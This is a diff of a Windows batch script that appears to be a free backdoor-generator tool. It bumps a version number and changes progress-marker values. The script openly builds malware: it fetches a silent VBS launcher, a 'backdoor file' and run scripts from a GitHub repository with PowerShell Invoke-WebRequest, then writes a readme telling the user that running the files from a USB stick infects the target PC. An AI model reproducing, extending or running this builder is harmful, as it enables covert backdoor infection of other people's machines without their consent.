@@ -1,7 +1,7 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=V4.39.27
+set update_number=V4.40.27
 set dev=0
 cls
 :VBSDynamicBuild
@@ -85,8 +85,11 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar.bat").Content >"progress bar.bat"
     start call "progress bar.bat"
     timeout 1 >nul
-    echo data>load_trigger.txt
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_placeholder.bat").Content >%opt1%.bat
+    echo 1>load_trigger.txt
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >temp.txt
+    powershell -Command "(gc temp.txt) -replace 'REPver', '%update_number%' | Out-File -encoding ASCII %opt1%.bat"
+    del temp.txt
+    echo 2>load_trigger.txt
   :: upload file to github
     echo [33mregistering code on github...[0m
     git config user.name "%username%"
@@ -102,17 +105,17 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     git push origin main
     echo [92mregistered file on github![0m
   :: generate a file to launch payload from start up folder in invisible mode
-   echo data>load_trigger.txt
+   echo 3>load_trigger.txt
     mkdir %opt2%\payload >nul
-    echo data>load_trigger.txt
+    echo 4>load_trigger.txt
     echo [33mdownloading code from github to create silent launch file...[0m
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.vbs").Content >%opt2%\payload\launch.vbs
     if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
   :: generate a file to run code from github on the target PC
-    echo data>load_trigger.txt
+    echo 5>load_trigger.txt
     echo [33mdownloading code from github to create backdoor file...[0m
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_BC.bat").Content >%opt2%\payload\payload.bat
-    echo data>load_trigger.txt
+    echo 6>load_trigger.txt
     set CUR_YYYY=%date:~10,4%
     set CUR_DD=%date:~4,2%
     set CUR_MM=%date:~7,2%
@@ -127,30 +130,30 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtime', '%current_time%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
   :: generate a file to move files to their proper location
-    echo data>load_trigger.txt
+    echo 7>load_trigger.txt
     echo [33mdownloading code to deliver backdoor...[0m
     if %target_admin_rights% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_yes_admin.bat").Content >%opt2%\run.bat
     if %target_admin_rights% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_no_admin.bat").Content >%opt2%\run.bat
     if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
   :: create readme file
-    echo data>load_trigger.txt
+    echo 8>load_trigger.txt
     echo [33mgenerating readme file...[0m
     echo you are using the free version and this backdoor will expire after 1 month or at the end of the year>%opt2%\readme.txt
     echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >>%opt2%\readme.txt
     if exist %opt2%\readme.txt echo [92msuccessfully created readme file![0m
   :: check all files where made
     echo [33mverifying all files where successfuly made...[0m
-    echo data>load_trigger.txt
+    echo 9>load_trigger.txt
     if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
     if exist %opt2%\payload\payload.bat (echo [92mbackdoor exists[0m) else (goto error6)
     if exist %opt2%\run.bat (echo [92mrun exists[0m) else (goto error7)
 :: delete files created during setup
-  echo data>load_trigger.txt
+  echo 10>load_trigger.txt
   echo [33mcleaning up temp files...[0m
   if exist %opt1%.bat (set temp=1) else (echo [92mno temp files where found[0m)
   if %temp% equ 1 del %opt1%.bat
   if %temp% equ 1 echo [92mtemp files deleted[0m
-  echo data>load_trigger.txt
+  echo 11>load_trigger.txt
 echo.
 echo press any key to exit...
 pause >nul
